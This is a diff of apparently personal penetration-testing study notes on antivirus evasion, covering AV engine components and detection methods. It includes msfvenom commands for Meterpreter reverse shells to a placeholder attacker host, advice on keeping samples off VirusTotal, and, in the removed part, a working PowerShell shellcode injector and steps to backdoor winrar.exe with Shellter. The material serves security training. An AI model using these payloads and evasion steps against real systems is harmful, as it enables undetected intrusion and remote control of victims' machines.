@@ -1,19 +1,112 @@
 
 
 Originally designed to remove viruses, AV's typically include firewalls, site scanners, etc.  
-  
+
 [https://cloudblogs.microsoft.com/microsoftsecure/2018/03/01/finfisher-exposed-a-researchers-tale-of-defeating-traps-tricks-and-complex-virtual-machines/](https://cloudblogs.microsoft.com/microsoftsecure/2018/03/01/finfisher-exposed-a-researchers-tale-of-defeating-traps-tricks-and-complex-virtual-machines/)  
+
+# Modern AV Components
+
+Designed around following components:
+## File Engine
+- Responsible for scheduled & real-time file scans.
+	- Scheduled
+		- Parses the entire file system and sends each file's metadata or data to signature engine
+	- Real-time
+		- Involves detecting & (possibly) reacting to any new file action
+			- IE: Downloading new malware from a site.
+		- Need to ID events at the kernel level via a *mini-filter driver*
+
+## Memory Engine
+- Inspects each process' memory space at runtime for well-known binary signatures or sus API calls (for memory injection attacks)
+
+## Network Engine
+- Inspects incoming and outgoing network traffic on the local nic
+- Once signature is matched, might attempt to block the malware from comm'ing w/ its C2
+
+## Disassembler
+- Translates machine code into assembly, restructures the original program code section, and IDs any encoding/ decoding routine.
+- Utilizes a sandbox or emulator for thorough analysis against any known signature
+
+## Browser Plugin
+- Browsers are protected by the sandbox, modern AVs often use browser plugins to get better visibility and detect malicious content that might be executed inside the browser.
+
+## ML Engine
+- Enables detection of unknown threats by relying on cloud-enhanced computing resources and algorithms
+
+
+
+# Detection Methods
+Since antivirus software vendors use different signatures and proprietary tech for detection,  
+and each vendor updates their databases constantly, it's usually difficult to come up with a catch-all antivirus evasion solution.  
+Quite often, this process is based on a trial-and-error approach in a test environment.  
   
+So, ID the presence, type, & version of the deployed antivirus software before considering a bypass strategy.  
   
-Test Setup:  
+If the client network or system implements antivirus software, we should gather as much information as possible  
+and replicate the configuration in a lab environment for AV bypass testing before uploading files to the target machine.  
+
+## Signature-based
+- Mostly considered a *restricted list technology*
+	- Filesystem is scanned for KM signatures &, if detected, quarantines the file.
+- Detects based on file hash or continuous sequence of bytes w/in the malware that uniquely ID's it.  
+- Blocklisting  
+	- Easy to bypass by changing/ obfuscating the contents
+		- Ex: changing upper to lowercase completely changes the hash
   
+## Heuristic-based
+- Relies on various rules & algorithms to determine whether or not an action is considered malicious.  
+- Steps through instruction set or attempts to de-compile & looks for malicious patterns/ program calls
+- Doesn't rely on signatures so can detect Unknown or altered KM
+  
+## Behavior-based 
+- Dynamically analyzes the behavior of the file.  
+- Executes w/in an emulated env & looks for malicious actions  
+- Doesn't rely on signatures so can detect Unknown or altered KM
+
+## Machine Learning-based
+- Uses ML algorithms to detect unknown threats by collecting and analyzing additional metadata
+	- Ex: Microsoft Windows Defender has two ML components
+		- Client ML engine
+			- Responsible for creating ML models and heuristics
+		- Cloud ML engine
+			- Capable of analyzing the submitted sample against a metadata-based model comprised of all the submitted samples.
+		- Whenever the client ML engine is unable to determine whether a program is benign or not, it will query the cloud ML counterpart for a final response.
+
+
+# Malware Submission
+
+Should be used as a last resort when we don't know the specifics of our target's AV vendor.
+If we do know those specifics on the other hand, we should build a dedicated VM that resembles the customer environment as closely as possible
+
+Another rule of thumb we should follow when developing AV bypasses is to always prefer custom code.
+AV signatures are extrapolated from the malware sample and thus, the more novel and diversified our code is, the fewer chances we have to incur any existing detection.
+
+## VirusTotal
+
+Issue with VT is that once you upload your malware and it's analyzed, the signature is shared with all of the AV vendors so they can sandbox it and build their own detections for it, rendering it unusable
+
+
+## AntiScan.Me
+
+Scans our sample against 30 different AV engines and claims to not divulge any submitted sample to third-parties
+- Only offers 4 scans a day
+- Doesn't support *.ps1*
+
+
+## Windows
+
+Windows utilizes an _Automatic Sample Submission_ to its ML engine which can be disabled
+	_Windows Security_ > _Virus & threat protection_ > _Manage Settings_ and deselecting the relative option
+
+
+### Example & Test AV
 - Create a Meterpreter payload:  
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f exe > binary.exe
 ```
 
 - Upload to VirusTotal:  
-	** Convenient but it generates a hash for each unique submission, which is then shared with all participating AV vendors.  
+	** Convenient but generates a hash for each unique submission, which is then shared with all participating AV vendors.  
 	  As such, take care when submitting sensitive payloads as the hash is essentially considered public from the time of first submission.
 
 ![[virus-total-bad.png]]
@@ -34,102 +127,7 @@ python3 -m http.server 80
 - Attempt to run _**binary.exe**_
 	![[avira-alert.png]]
 
-AV evasion falls into two broad categories: [on-disk](14.2.1%20-%20On-Disk.md) and [in-memory](14.2.2%20-%20In-Memory.md).
+AV evasion falls into two broad categories: [on-disk](14.3.md) and [in-memory](14.3.1.md).
   
 Given the maturity of AV file scanning, modern malware often attempts **in-memory** operation, avoiding the disk entirely and therefore reducing the possibility of being detected.  
 
-
-
-### PowerShell In-Memory Injection:
-
-Will use a technique similar to Remote Process Memory Injection.  
-Main difference - we'll target the currently executing process: PowerShell Interpreter.  
-```powershell
-$code = '  
-[DllImport("kernel32.dll")]  
-public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);  
-  
-[DllImport("kernel32.dll")]  
-public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);  
-  
-[DllImport("msvcrt.dll")]  
-public static extern IntPtr memset(IntPtr dest, uint src, uint count);';  
-  
-$winFunc =   
-  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;  
- 
-[Byte[]]$sc = <place your shellcode here>;  
-  
-$size = 0x1000;  
-  
-if ($sc.Length -gt 0x1000) {$size = $sc.Length};  
-  
-$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);  
-  
-for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};  
-  
-$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
-```
-.
-- Imports _VirtualAlloc_ from _kernel32.dll_  
-	- (to allocate memory - Lines 2 - 3)  
-- Imports _CreateThread_ from _kernel32.dll_  
-	- (create an execution thread - Lines 5 - 6)  
-- Imports _memset_ from _msvcrt.dll_  
-	- (write arbitrary data to the allocated memory - Lines 8 - 9)  
-- Allocates a block of memory using _VirtualAlloc_  
-	- (Lines 14 & 19 - 21)  
-- Takes each byte of the payload stored in the _$sc_ byte array & Writes it to our newly allocated memory block using _memset_
-	- (Lines 15 & 23)  
-- Execute in separate thread  
-	- (Line 25)  
-  
-Payload (meterpreter) creation:  
-```bash
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f powershell
-```
-
-
-In order to get it to run, you need to be mindful of the user's [Execution Policy](Execution%20Policy.md).  
-  
-  
-From [Exercise #6:](e17%20-%20AV%20Evasion.md#17.3.5.6) 
-  
-Although the PowerShell AV bypass we covered in this module is substantial, it has an inherent limitation:  
-The malicious script cannot be "double-clicked" by the user for an immediate execution. Instead, it would open in **notepad.exe** or another default text editor.  
-  
-The tradecraft of manually weaponizing PowerShell scripts is beyond the scope of this module, but we can rely on another open-source framework to help us automate this process.  
-Research how to install and use the [Veil](https://github.com/Veil-Framework/Veil) framework to help  
-
-  
-  
-### Shellter:
-
-[Shellter](Shellter.md) is a dynamic shellcode injector which can bypass AVs.  
-  
-We'll run in Auto mode for this example:  
-
-Download 32-bit version of **winrar.exe** from [https://www.rarlab.com/download.htm](https://www.rarlab.com/download.htm) onto Kali  
-  
-In Shellter:  
-- Select a Target PE (full/path/**winrar.exe**)  
-- Choose Stealth Mode - Y  
-- Choose Payload - Meterpreter Reverse TCP  
-- Set Meterpreter Options - LHOST & LPORT  
-  
-In Kali:  
-- Start a Meterpreter listener to catch the conn:  
-```bash
-msfconsole -x "use exploit/multi/handler; set LHOST <attacker_ip>; set LPORT <port>; set PAYLOAD windows/meterpreter/reverse_tcp"
-```
-
-Transfer file to compromised Win machine.  
-  
-*****NOTE:** As it stands, the successful Meterpreter session will close out once the installer is either finished running OR is cancelled.  
-  
-Add an _AutoRunScript_ to migrate Meterpreter to a separate process immediately after session creation:  
-```bash
-set AutoRunScript post/windows/manage/migrate
-```
-
-Run compromised binary
